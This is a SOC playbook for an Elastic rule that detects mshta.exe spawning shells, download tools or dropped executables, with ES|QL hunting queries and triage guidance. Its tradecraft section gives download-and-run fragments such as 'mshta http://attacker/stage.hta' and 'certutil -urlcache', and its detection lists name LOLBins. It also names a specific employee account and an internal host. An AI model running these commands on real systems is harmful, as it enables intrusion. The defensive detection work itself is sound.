# Suspicious Microsoft HTML Application Child Process [NBI-4688] — SOC Investigation Playbook

**Rule ID:** `nbi-b2-suspicious-microsoft-html-application-child-proc` · **Type:** eql · **Language:** eql · **Severity:** High · **Confidence:** Medium · **Platform:** Elastic Security (NBI)
**Primary index (live):** `logs-system.security-*` (Windows Security Event 4688) · **Alert entities:** `$host`, `$user`, `$process`, `$suspicious_pid`, `$source_ip`

> Substitute the alert's real values for the `$vars` before running any query. This playbook was authored and live-validated against NBI telemetry with `$host = nim-fti-apv01`, `$user = IBC.MohamadChbaro`, `$process = mshta.exe`, `$suspicious_pid = 780`, `$source_ip = 10.11.18.21` (a real application-server host with dense 4688 process-creation telemetry and a real named interactive account, used to prove each pivot executes). The `$suspicious_pid` used for validation is a real parent PID on that host so the lineage walk returns data. Every ES|QL block below returned successfully on the live NBI cluster; the `mshta.exe` anchor returns 0 rows because mshta is absent from NBI's live window (the honest zero baseline), and **empty result never means safe**.

---

## 1. Purpose

This playbook drives triage and investigation of the **Suspicious Microsoft HTML Application Child Process** detection on NBI's Elastic Security deployment. The rule fires when **`mshta.exe` (the HTML Application host) spawns a child** that is either a living-off-the-land binary (`cmd`, `powershell`, `certutil`, `bitsadmin`, `curl`, `msiexec`, `schtasks`, `reg`, `wscript`, `rundll32`) **or an executable running from a user-profile path** (`C:\Users\...\*.exe`). `mshta.exe` on its own is a legitimate Windows binary that renders HTA markup; a shell, download tool, persistence utility, or dropped user-profile EXE as its child is the observable sign that an HTA actually **executed code** rather than merely displaying a page.

An alert therefore captures the **execution stage after an HTA loader runs** — typically the moment a phishing click becomes code execution. The analyst's job is to decide, quickly and defensibly, whether an HTA legitimately drove a benign helper (rare — **false_positive, authorised**), an HTA loader executed malicious follow-on code (**true_positive**), a line-of-business HTA application was simply never baselined (**misconfiguration**), or the evidence is insufficient (**needs_escalation**). This analytic is the downstream companion to the mshta script-execution detection — there the concern is the script mshta *ran*; here it is what mshta *launched*.

## 2. Detection Summary

The deployed rule is an **EQL** analytic. As characterised by its trigger logic, it fires on a process-creation event whose **parent is `mshta.exe`** and whose **child is a LOLBin or a user-profile executable**:

```eql
process where host.os.type == "windows" and event.type == "start" and
  process.parent.name : "mshta.exe" and
  (
    process.name : ("cmd.exe", "powershell.exe", "certutil.exe", "bitsadmin.exe",
                    "curl.exe", "msiexec.exe", "schtasks.exe", "reg.exe",
                    "wscript.exe", "rundll32.exe")
    or process.executable : "?:\\Users\\*\\*.exe"
  )
```

Plain English: `mshta.exe` spawned either a shell/download/persistence/installer/proxy tool or a binary running from a user profile — the tell that an HTA did more than render markup.

Unlike some Windows analytics, this one is **fully live-capable on NBI**: it keys on Windows Security **4688** (`event.code : "4688"`), which NBI collects. The one-line Kibana KQL detection/pivot filter is:

```kql
event.code : "4688" and process.parent.name : "mshta.exe" and (process.name : ("cmd.exe" or "powershell.exe" or "certutil.exe" or "bitsadmin.exe" or "curl.exe" or "msiexec.exe" or "schtasks.exe" or "reg.exe" or "wscript.exe" or "rundll32.exe") or process.executable : "C\:\\Users\\*")
```

In NBI's live window `mshta.exe` is absent, so the rule should be near-silent; any mshta-parented child is a high-value lead. Empty results are the expected zero baseline and are **not** evidence of safety — command-line capture is only ~50% populated (§8), and a child spawn is confirmed even when its command line is null.

## 3. Alert Meaning

An alert means: **on `$host`, `mshta.exe` spawned a child process that indicates code execution** — a shell, a downloader, a persistence utility, an installer, a proxy-execution binary, or a dropped user-profile EXE. `mshta.exe` is a Microsoft-signed, allow-listed binary that executes the JScript/VBScript inside an `.hta`; attackers deliver an HTA by phishing (attachment or a `mshta http://…` link), and when it runs it typically shells out to fetch and launch the next stage. The child the rule caught is that next stage.

The logon/render step is not in itself malicious — the **child** is the signal. The investigative questions are: **what is the child and what did its command line do** (download? persist? run a payload?), **did the account go on to establish persistence or fetch more payloads**, and **what launched mshta in the first place** (an office/browser/mail parent points to phishing). A download/persistence child, or a dropped user-profile EXE, is a working malware loader on the endpoint.

## 4. Typical Attacker Behavior

The technique proceeds in a tight sequence:

1. The victim receives an HTA by phishing — an `.hta` attachment, a link that opens `mshta.exe http://attacker/stage.hta`, or an HTA dropped from an archive/download.
2. `mshta.exe` executes the HTA's inline script. The script **shells out**: `powershell -enc <base64>`, `cmd /c`, `certutil -urlcache -f http://… payload`, `bitsadmin /transfer`, `curl` to fetch a stage, or `rundll32`/`msiexec` proxy execution.
3. The child **downloads and runs** the next stage (often a dropped EXE under `C:\Users\<user>\…`), and/or **establishes persistence** (`schtasks /create`, `reg add …\Run`, a service via `sc`).
4. From there the operator pursues credential theft, additional download, and lateral movement.

Follow-on tradecraft to expect on the same host/user in the window: download tooling (`certutil`, `bitsadmin`, `curl`), persistence tooling (`schtasks`, `reg`, `sc`), interpreters (`powershell`, `wscript`, `cmd`), proxy execution (`rundll32`), and a first-seen EXE in a user-writable path. The mail/office/browser parent of mshta is the initial-access fingerprint.

## 5. Common False Positives

- **Legacy line-of-business HTA applications.** Some enterprise apps ship an `.hta` front-end that legitimately spawns a helper (a `cmd`/`wscript` wrapper, an installer). These are the main benign case and are confirmed by a recognised application HTA, a consistent benign child, and **no download/persistence** follow-on — not assumed.
- **Software installers / management tooling** that invoke `mshta` as part of setup and shell to a helper. Rare on a bank estate.
- **Administrator or vendor scripts** that wrap configuration in an HTA. Confirm against a change record.
- A child positively proven to have **failed or been blocked** (allow-listing/AV denied it, no download or child activity) is recorded as **blocked-malicious**, never "benign".

## 6. Environment-Specific False Positives (NBI)

Validated against NBI's live `logs-system.security-*`:

- **`mshta.exe` is absent from NBI's live 4-hour window.** mshta-parented children are therefore expected to be rare, and any hit is a high-value lead with **no noisy legitimate source to tune out**.
- **The plausible-legitimate locus is an interactive user or a jump/VDI host**, where a genuine LOB HTA might run; NBI's busy servers are dominated by service/machine-account process creation and would not normally launch mshta at all. A mshta child on a server is more anomalous still.
- **Command-line auditing is bimodal (~50% estate-wide).** The child's command line — the clearest download/persistence evidence — is populated on some hosts and null on others (§8). A null child command line still confirms the spawn and is not exoneration; corroborate with the child identity, follow-on activity, and (for a dropped EXE) the `process.executable` path via EDR.
- **No historical NBI benign-true-positive is on record for this rule.** There is no environment-specific allow-list to apply; scope any future exception to an exact application HTA + child + path + host + user after a documented owner is confirmed.

## 7. Investigation Prerequisites

- Read-only access to NBI Elastic Security (Discover, Timeline, Alerts) and the `_query` ES|QL API.
- The alert's entity values: `host.name` (`$host`), the acting `user.name` (`$user`), the mshta host binary `process.name` (`$process`, here `mshta.exe`), the mshta or child `process.pid` for lineage (`$suspicious_pid`), and — if the session is remote — the logon `source.ip` (`$source_ip`).
- Awareness of NBI's telemetry reality (§8): **4688 only, no Sysmon, no Elastic Defend/EDR, no process hashes, host-dependent command-line capture.** The child's command line and any dropped-EXE `process.executable` may need to be recovered from the host/EDR out of band.
- A tight incident window — every ES|QL block below uses `@timestamp >= NOW() - 4 hours`; widen only in Discover with care, anchored on the alert time.

## 8. Required Data Sources

**Live and used by this playbook:**

- **`logs-system.security-*`** — Windows Security Event Log. Event **4688** (a new process has been created) is the anchor: `event.type = "start"`, provider `Microsoft-Windows-Security-Auditing`. Supporting events used in pivots: **4624/4625/4634/4647** (logon/logoff), **4672** (special privileges), **4698** (scheduled task), **4720** (account created), **7045** (service installed), **5140/5145** (share access), **1102** (log cleared), **4719** (audit policy changed).

**Field population on 4688 (measured live on NBI):**

| Field | Population | Note |
|---|---|---|
| `process.name`, `process.executable` | ~100% | Child image name + full path — the primary artifact (dropped user-profile EXE path lives here). |
| `process.parent.name`, `process.parent.executable` | ~99.7% | Parent image — where `mshta.exe` is matched. |
| `process.pid`, `process.parent.pid` | ~100% | **PID-based lineage** (no Sysmon `process.entity_id` on NBI). |
| `user.name`, `winlog.event_data.SubjectUserName` | ~100% | Acting account. |
| `host.name`, `host.os.type` | ~100% | `host.os.type` = `windows`. |
| `process.command_line` | **host-dependent** (~50% estate-wide) | Bimodal — the child's `powershell -enc` / download / persistence command lives here where present, null where the GPO is off. |
| `process.args` (multivalued) | tracks `command_line` | Corroborate with `MV_CONCAT(process.args, " ")`. |

**Declared/relevant but DEAD in NBI (0 docs — never query; note the capability gap):** `logs-windows.sysmon_operational-*`, `logs-endpoint.events.process-*` (Elastic Defend), `logs-crowdstrike.fdr*`, `winlogbeat-*`, `logs-windows.forwarded*`.

**Telemetry-blocked / partial signals (state plainly):**

- **No process hashes** (`process.hash.*` absent on 4688), so a dropped-EXE reputation lookup must be obtained out of band from the host.
- **No process network/DNS events**, so the download destination the child fetched cannot be pivoted inside `logs-system.security-*`.
- **The child command line is only ~50% populated** — where null, the spawn is still confirmed but the payload detail must come from EDR/host.

Empty result ≠ safe: absence of a recoverable command line or a follow-on chain never proves the mshta child was benign.

## 9. MITRE ATT&CK Mapping

From the rule's `threat[]`:

- **Tactic: Defense Evasion (TA0005)** — https://attack.mitre.org/tactics/TA0005/
- **Tactic: Execution (TA0002)** — https://attack.mitre.org/tactics/TA0002/
- **Technique: T1218 — System Binary Proxy Execution** — https://attack.mitre.org/techniques/T1218/
- **Sub-technique: T1218.005 — System Binary Proxy Execution: Mshta** — https://attack.mitre.org/techniques/T1218/005/

The behaviour is proxy execution through a signed Microsoft binary (`mshta.exe`) that evades application controls (defense evasion) while running attacker code (execution).

## 10. Severity Guidance

Deployed severity is **High** (confidence Medium). Adjust the *effective* incident priority using NBI-specific context:

- **Raise toward critical** when: the child is a **download** or **persistence** tool (`certutil`/`bitsadmin`/`curl`; `schtasks`/`reg`/`sc`), the child command line carries `-enc`/`http`/`-urlcache`, a **dropped user-profile EXE** is the child (§15.10), mshta's **parent** is office/browser/mail (§15.3, initial access), the account went on to persist/download (§17.2/§15.2), or `$host` is a server/Tier-0 system.
- **Keep at high** for any confirmed mshta LOLBin/dropped-EXE child with no authorised explanation.
- **Lower only** to **false_positive** when a recognised LOB application HTA + benign child + no download/persistence is positively evidenced, or the child is proven blocked. Because NBI's mshta baseline is effectively zero, the default posture is "treat as real".

## 11. Triage Process (Tier 1)

Target: reach a hold/confirm/escalate decision in ~15 minutes.

1. **Read the alert entities.** Note `$host`, `$user`, the child `process.name` and `process.executable`, `$suspicious_pid`, and timestamp. Confirm the parent really is `mshta.exe`.
2. **Confirm the child and read its command line** with §14.2 / §15.1 (MHC-INV-01). A `powershell -enc`, an `http` download, `certutil -urlcache`, or `schtasks /create` child is unambiguous loader activity.
3. **Classify the child** with §15.2 (MHC-INV-02): download-tool / persistence-tool / shell-or-script / installer / proxy-exec / dropped-EXE.
4. **Check follow-on** with §15.2 / §17.2 (MHC-INV-03): did `$user` go on to persist or fetch more payloads on `$host`?
5. **Judge the parent / initial vector** (§15.3): an office/browser/mail parent for mshta is the phishing chain.
6. **Decide:** download/persistence child or dropped EXE with follow-on → escalate to Tier 2 as **true_positive** candidate; recognised LOB application HTA + benign child + no follow-on → **false_positive (authorised)**; recognised-but-unbaselined app → **misconfiguration**; ambiguous/unrecoverable → **needs_escalation**. Never close as benign without proof.

## 12. Investigation Workflow (Tier 2 / Tier 3)

1. **Confirm the child and its command line** (§15.1) — the direct evidence of what the HTA executed; corroborate the command line via `MV_CONCAT(process.args," ")` where the host audits it.
2. **Classify the child capability** (§15.2) — download/persistence/shell grade the severity; a dropped user-profile EXE is triaged by path (§15.10) and hash/EDR out of band.
3. **Establish impact/persistence** (§17.2) — a rich follow-on chain (schtasks/reg/sc + certutil/bitsadmin/curl) confirms a working intrusion.
4. **Pin the initial vector** (§15.3) — office/browser/mail parent = phishing; a script-chain parent = multi-stage loader.
5. **Scope the user and host** (§15.4, §15.5) and the session origin (§15.6, §15.12); walk the child's descendants by PID (§15.3b, §17.5).
6. **Build the timeline** (§16) and escalate to Tier 3 / IR per §21 when a working loader is confirmed.

## 13. Decision Tree

```
Alert: mshta.exe spawned a LOLBin / user-profile-EXE child on $host (§14 confirms the 4688)
│
├─ Anchor 4688 not reproducible / parent is not mshta.exe
│     → re-open in Discover anchored to the alert time. If truly absent → needs_escalation (data-quality)
│
├─ Anchor confirmed → assess the child + command line + follow-on
│   │
│   ├─ Recognised LOB application HTA, benign child, NO download/persistence (evidenced, not assumed)
│   │     → false_positive (authorised application HTA helper) — document the owner
│   │
│   ├─ Legitimate application HTA spawning helpers but not yet baselined
│   │     → misconfiguration — baseline the app; recommend migrating off mshta
│   │
│   ├─ Child positively proven blocked/failed (no download, no child activity)
│   │     → false_positive (blocked-malicious) — documented as blocked, never "benign"
│   │
│   └─ Download/persistence/shell child OR dropped user-profile EXE, AND/OR persistence/download
│       follow-on by $user (§17.2)
│         → true_positive — proceed to Containment (§18); escalate per §21
│
└─ Child command line unrecoverable AND follow-on ambiguous
      → needs_escalation — hand to Tier 3/IR with the gaps noted
```

## 14. Validation Queries

### 14.1 Reproduce the rule estate-wide (LOLBin child arm)

Faithful ES|QL translation of the deployed EQL's LOLBin arm (the user-profile-EXE arm is evaluated host-scoped in §15.10 to avoid an estate-wide leading-wildcard scan). Confirms whether the anchor condition is currently satisfied anywhere. In NBI this is normally 0 — the zero baseline; a non-zero result is immediately notable.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND TO_LOWER(process.parent.name) == "mshta.exe"
    AND TO_LOWER(process.name) IN ("cmd.exe", "powershell.exe", "certutil.exe", "bitsadmin.exe", "curl.exe", "msiexec.exe", "schtasks.exe", "reg.exe", "wscript.exe", "rundll32.exe")
| KEEP @timestamp, host.name, user.name, process.name, process.executable, process.parent.name, process.pid, process.parent.pid
| SORT @timestamp DESC
| LIMIT 100
```

### 14.2 Confirm on the alert host (all mshta children + command line)

Reused from the deployed playbook (MHC-INV-01), verbatim. Recovers every child of `mshta.exe` on `$host` and its command line — the direct evidence of what the HTA executed.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host"
    AND TO_LOWER(process.parent.name) == "mshta.exe"
    AND @timestamp >= NOW() - 4 hours
| KEEP @timestamp, host.name, user.name, process.name, process.parent.name, process.command_line, process.args
| SORT @timestamp DESC
| LIMIT 20
```

## 15. Investigation Queries — Entity Pivots

### 15.1 Entity pivoting

Anchor on the alert's entity set: retrieve the mshta children on `$host` with the full 4688 field set, so every downstream `$var` (child image, path, pid, parent pid, user) is confirmed from real data.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.parent.name) == "$process"
| KEEP @timestamp, host.name, user.name, process.name, process.executable, process.parent.name, process.pid, process.parent.pid, process.command_line
| SORT @timestamp DESC
| LIMIT 50
```

### 15.2 Process investigation

**15.2a — Classify the child behaviour.** Reused from the deployed playbook (MHC-INV-02), verbatim. Buckets mshta's children by capability so download/persistence/shell activity is graded quickly.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host"
    AND TO_LOWER(process.parent.name) == "mshta.exe"
    AND @timestamp >= NOW() - 4 hours
| EVAL child_type = CASE(
    TO_LOWER(process.name) IN ("certutil.exe", "bitsadmin.exe", "curl.exe"), "download-tool",
    TO_LOWER(process.name) IN ("powershell.exe", "cmd.exe", "wscript.exe"), "shell-or-script",
    TO_LOWER(process.name) IN ("schtasks.exe", "reg.exe"), "persistence-tool",
    TO_LOWER(process.name) == "msiexec.exe", "installer",
    TO_LOWER(process.name) == "rundll32.exe", "proxy-exec",
    "other-or-dropped-exe")
| STATS execs = COUNT(*) BY child_type, process.name, user.name
| SORT execs DESC
| LIMIT 20
```

**15.2b — Command-line enrichment of the children where the host audits it.** Only hosts with the command-line GPO populate `process.args`; this surfaces the child's real download/persistence command via `MV_CONCAT` and honestly returns nothing on command-line-less hosts.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.parent.name) == "$process"
    AND process.args IS NOT NULL
| EVAL arguments = MV_CONCAT(process.args, " ")
| KEEP @timestamp, user.name, process.name, process.executable, arguments
| SORT @timestamp DESC
| LIMIT 50
```

### 15.3 Parent-Child process analysis

**15.3a — The mshta lineage on the host.** Both directions: who/what launched `mshta.exe` (grandparent = the initial vector) and what `mshta.exe` spawned (the alert child).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND (TO_LOWER(process.parent.name) == "$process" OR TO_LOWER(process.name) == "$process")
| KEEP @timestamp, user.name, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp DESC
| LIMIT 50
```

**15.3b — Walk the child's descendants by PID.** NBI has no Sysmon `process.entity_id`, so lineage is reconstructed by joining `process.parent.pid` to the suspicious child's `process.pid` (`$suspicious_pid`) within a tight window. Corroborate with `process.parent.name` because PIDs are reused. Populate `$suspicious_pid` from the mshta child's `process.pid` in §15.1.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND process.parent.pid == $suspicious_pid
| KEEP @timestamp, user.name, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp ASC
| LIMIT 100
```

### 15.4 User investigation

Where has `$user` executed processes, and how broad is their footprint in the window? A normally host-bound user suddenly spanning multiple hosts is itself suspicious.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND user.name == "$user"
| STATS executions = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
| SORT executions DESC
| LIMIT 20
```

### 15.5 Host investigation

Baseline the host by surfacing its **rarest** process/parent pairs first — LOLBins, one-off tooling, and out-of-place children (including mshta itself) stand out against the routine session churn.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
| STATS executions = COUNT(*), users = COUNT_DISTINCT(user.name) BY process.name, process.parent.name
| SORT executions ASC
| LIMIT 40
```

### 15.6 IP investigation

**15.6a — Where did `$user` log in from on `$host`.** `source.ip` is present on network (type 3) and RemoteInteractive/RDP (type 10) logons; it is null on local interactive (type 2). This reveals the operator's origin for the session in which the HTA ran.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND host.name == "$host" AND user.name == "$user"
    AND source.ip IS NOT NULL
| STATS logons = COUNT(*) BY source.ip, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 20
```

**15.6b — Reverse pivot on the source IP.** Who else authenticated from `$source_ip`? In NBI a single egress IP frequently fronts many users (shared VDI/admin infrastructure), so treat `source.ip` as a weak individual identifier and always correlate IP + user + host.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND source.ip == "$source_ip"
| STATS logons = COUNT(*) BY user.name, host.name, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 25
```

### 15.7 Domain investigation

N/A — DNS/network-domain telemetry is not collected for NBI Windows hosts. There is no Sysmon (`logs-windows.sysmon_operational-*` dead), no Elastic Defend network/DNS events (`logs-endpoint.events.network*` dead), and Windows Security 4688 carries no domain-contacted field. The domain the HTA/child fetched from cannot be resolved from `logs-system.security-*`. Alternative: pivot on the host's IP in `logs-fortinet_fortigate.log-*` out of band.

### 15.8 URL investigation

N/A — there is no URL field on Windows Security 4688 and no proxy/EDR web index tied to `$host`. Note that a remote HTA URL (`mshta http://…`) appears **inside the child/parent command line**, not a structured URL field — recover it from §15.2b (`MV_CONCAT(process.args," ")`) where the host audits the command line, and from perimeter web/proxy logs (`logs-fortinet_fortigate.log-*` / FortiWeb under `logs-tcp.generic-*`) by the host IP out of band.

### 15.9 Hash investigation

N/A — process hashes are not collected. `process.hash.*` does not exist on 4688 (no Sysmon/EDR on NBI). Reputation lookups cannot be driven from telemetry. Alternative: obtain the SHA-256 of any **dropped user-profile EXE** child (path from §15.10) directly from `$host` with PowerShell `Get-FileHash`, then check reputation out of band.

### 15.10 File investigation

Enumerate the distinct `process.executable` locations of mshta's children on `$host`. This directly surfaces the deployed rule's **user-profile-EXE arm** — a child running from `C:\Users\<user>\…` is a dropped payload — and is host+parent-scoped, so it is safe (no estate-wide leading-wildcard scan).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.parent.name) == "$process"
| STATS executions = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.executable, process.name
| SORT executions DESC
| LIMIT 30
```

A child `process.executable` under `Users\`, `Temp`, `ProgramData`, or `Downloads` is a dropped payload; obtain its hash host-side (§15.9). The HTA file itself is not a Windows Security artifact — recover it from the host.

### 15.11 Email investigation

N/A — no email/message telemetry is in scope for this host-based execution alert on NBI. There is no live O365/Exchange message index (`logs-m365_defender.*` carries alerts only, not mail items). Alternative: because HTAs are overwhelmingly phishing-delivered, pivot in the mail-security stack out of band using `$user` as the recipient and the incident timeframe to find the delivering message/attachment.

### 15.12 Authentication investigation

Reconstruct `$user`'s logon/logoff activity on `$host` to bound the session in which the HTA ran and spot anomalies (e.g. a service/network logon type where an interactive one is expected).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4625", "4634", "4647")
    AND host.name == "$host" AND user.name == "$user"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.code, winlog.event_data.LogonType, source.ip
| SORT events DESC
| LIMIT 30
```

## 16. Timeline Reconstruction

Build a time-ordered process-creation stream for `$user` on `$host`. Because `process.pid`/`process.parent.pid` are ~100% populated, the chain is legible directly, letting you place `parent → mshta → child → descendants` in sequence with surrounding activity. Anchor on the alert timestamp and read outward.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND user.name == "$user"
| KEEP @timestamp, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp ASC
| LIMIT 200
```

For a broader host timeline (all users), drop the `user.name` predicate. If the host lacks command-line auditing, lineage + image paths are your narrative; the child command line will be null.

## 17. Attack-Chain Validation

### 17.1 Lateral movement validation

Did `$user` authenticate or reach shares on hosts **other than** `$host` in the window? Network/explicit-credential logons and Kerberos ticketing to new systems after the HTA execution are the signal. Expect some legitimate DC ticketing for normal users; weigh it against role.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4648", "4768", "4769", "5140")
    AND user.name == "$user"
    AND host.name != "$host"
| STATS events = COUNT(*) BY host.name, event.code, winlog.event_data.LogonType
| SORT events DESC
| LIMIT 30
```

### 17.2 Persistence validation

Reused from the deployed playbook (MHC-INV-03), verbatim. Whether `$user` went on to establish persistence or fetch more payloads on `$host` after the mshta child — the impact beyond the initial spawn. A rich chain (schtasks/reg/sc + certutil/bitsadmin/curl) confirms a working intrusion; empty follow-on does not clear the host where command-line auditing is off.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND user.name == "$user"
    AND @timestamp >= NOW() - 4 hours
    AND TO_LOWER(process.name) IN ("schtasks.exe", "reg.exe", "certutil.exe", "bitsadmin.exe", "curl.exe", "powershell.exe", "rundll32.exe", "wscript.exe", "sc.exe")
| STATS execs = COUNT(*), last_seen = MAX(@timestamp) BY process.name
| SORT execs DESC
| LIMIT 20
```

Corroborate destructive/service persistence primitives (`7045` service install, `4698` scheduled task, `4720` account create) on `$host` in the same window:

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND event.code IN ("7045", "4698", "4720")
| STATS events = COUNT(*) BY event.code
| SORT events DESC
| LIMIT 10
```

### 17.3 Privilege escalation validation

Enumerate which accounts received **special (admin-equivalent) privileges** on `$host` via Event 4672, and compare against `$user`. An HTA loader that escalates (or whose child runs elevated) is a materially worse incident; a non-privileged `$user` whose child tooling nonetheless persisted is the common loader shape.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4672"
    AND host.name == "$host"
| STATS special_priv_logons = COUNT(*) BY user.name
| SORT special_priv_logons DESC
| LIMIT 25
```

### 17.4 Defense evasion validation

Check for evidence-destruction / defence-tampering on `$host`: event-log clearing (`1102`), audit-policy change (`4719`), and 4688 executions of `wevtutil.exe`/`fsutil.exe`/`vssadmin.exe`/`wmic.exe`/`cipher.exe`. mshta proxy execution is itself a defence-evasion technique (signed-binary script host); absence of cleanup evidence is not exoneration.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("wevtutil.exe", "fsutil.exe", "vssadmin.exe", "wmic.exe", "cipher.exe", "sdelete.exe", "sdelete64.exe"))
        OR event.code == "1102"
        OR event.code == "4719"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 30
```

### 17.5 Impact assessment

Quantify what the mshta child actually did by enumerating everything it spawned (its descendants by PID). A shell/download child that then launches recon, credential, or persistence tooling is a materially different incident from one that spawned nothing. Populate `$suspicious_pid` from the mshta child's `process.pid` in §15.1.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND event.code == "4688"
    AND process.parent.pid == $suspicious_pid
| STATS children = COUNT(*), distinct_children = COUNT_DISTINCT(process.name) BY process.name
| SORT children DESC
| LIMIT 30
```

## 18. Containment

- **Isolate `$host`** (network-contain / quarantine) if a true_positive is confirmed, to stop the loader fetching further stages and moving on. Coordinate with IT on shared hosts but prioritise containment.
- **Suspend or force-logoff `$user`'s session** on `$host` and **disable the account** pending investigation; reset its credentials (§20).
- **Terminate the mshta child and its descendants** (`$suspicious_pid` tree from §15.3b / §17.5), and mshta itself if still running.
- **Preserve volatile evidence first** where feasible: running process list, the dropped user-profile EXE (path from §15.10), the HTA file, and memory of the child. NBI does not collect the download or the HTA write, so host-side capture is the only way to recover them.
- Deploy/confirm changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.

## 19. Eradication

- **Remove the persistence** discovered in §17.2 (scheduled tasks, Run keys, services) and any dropped payload identified via §15.10.
- **Delete the HTA and any second-stage binaries** it fetched or wrote, recovered host-side.
- **Run a full anti-malware / EDR scan** on `$host` and hunt for the same HTA/payload and the mshta-parent pattern across peers — especially any host `$user` touched (§15.4, §17.1).
- **Remediate the initial-access vector** — the phishing message/attachment that delivered the HTA (§15.11), and the office/browser/mail parent that launched mshta (§15.3).

## 20. Recovery

- **Reset `$user`'s password** and any credentials accessible from `$host` during the intrusion window; if privileged accounts logged on there (§17.3), rotate those too.
- **Restore `$host`** from a known-good image if the loader established persistence or dropped multiple stages; otherwise validate that all eradication actions hold after reboot.
- **Return the host/account to service** only after §22 closing criteria are met and monitoring confirms mshta does not recur.
- **Harden.** Block or restrict `mshta.exe` by policy (WDAC/AppLocker), alert on mshta spawning shells/download tools, strip HTA attachments at the mail gateway, and enable command-line auditing on the host class — the single highest-value gap for this rule.

## 21. Escalation Criteria

Escalate to Tier 3 / Incident Response (and notify the customer) when **any** of the following hold:

- The mshta child is a **download** or **persistence** tool, or a **dropped user-profile EXE** (§15.2/§15.10).
- Persistence/download **follow-on** by `$user` is present (§17.2), or the child spawned further tooling (§17.5).
- mshta's **parent** is office/browser/mail (§15.3) — an active phishing chain.
- Lateral movement from `$host`/`$user` is observed (§17.1), especially toward domain controllers or other privileged systems.
- The acting account is privileged/service, or log clearing / audit-policy tampering appears (§17.4).
- Evidence is incomplete because of NBI's telemetry gaps (null command line, no dropped-EXE hash) and the alert cannot be safely cleared — escalate as **needs_escalation** with the gaps named.

## 22. Closing Criteria

- **false_positive (authorised):** a recognised line-of-business application HTA, a benign child, and **no** download/persistence are positively matched to the exact `$process`(mshta) + child + `$user` + `$host` + time. Record the owner; scope any exception to the exact application HTA + child + path + host + user.
- **false_positive (blocked-malicious):** the child was positively proven blocked/failed (no download, no child activity); documented as blocked (never "benign").
- **misconfiguration:** a legitimate application HTA spawns helpers and was simply not yet baselined; baseline it and recommend migrating off mshta.
- **true_positive:** a working HTA loader confirmed (LOLBin/dropped-EXE child with follow-on); containment/eradication/recovery completed, scope of `$user`/`$host`/peers and the phishing source established, no residual persistence or recurrence.
- **needs_escalation:** handed to Tier 3/IR with the specific evidence gaps documented.

In all cases: attach the ES|QL used and its results, the entity values, and the classification rationale to the alert before closing.

## 23. Analyst Notes

- **The child is the signal, not mshta.** `mshta.exe` rendering an HTA is not by itself malicious; a LOLBin/dropped-EXE **child** is the observable that the HTA executed code. Read the child and its command line first (§15.1/§15.2b).
- **mshta's near-zero baseline = high fidelity.** mshta is absent from NBI's live 4h window; there is nothing legitimate to tune out, so any mshta-parented child is a strong lead despite the possibility of a rare LOB HTA.
- **Command-line capture is bimodal (~50%).** The `powershell -enc`/download/persistence command is your best evidence where present and simply null where the GPO is off — corroborate with child identity, follow-on (§17.2), the dropped-EXE path (§15.10), and PID lineage.
- **The dropped EXE lives in a user path.** The rule's user-profile-EXE arm surfaces in §15.10 as a child `process.executable` under `Users\`/`Temp`/`ProgramData` — hash it host-side (no `process.hash.*` on NBI).
- **Pair with the companion analytic.** The mshta *script-execution* rule catches what mshta ran; this one catches what it launched — investigate them together when both fire on the same host/user.
- **KB-worthy (persist to NBI customer scope):** (1) mshta zero-baseline over 4h on `logs-system.security-*`; (2) command-line/`process.args` host-bimodality (~50%); (3) `process.hash.*` absent on 4688; (4) user-profile-EXE arm is observable via child `process.executable` host-scoped. All observed live on 2026-08-19.

## 24. References

- MITRE ATT&CK — System Binary Proxy Execution (T1218): https://attack.mitre.org/techniques/T1218/
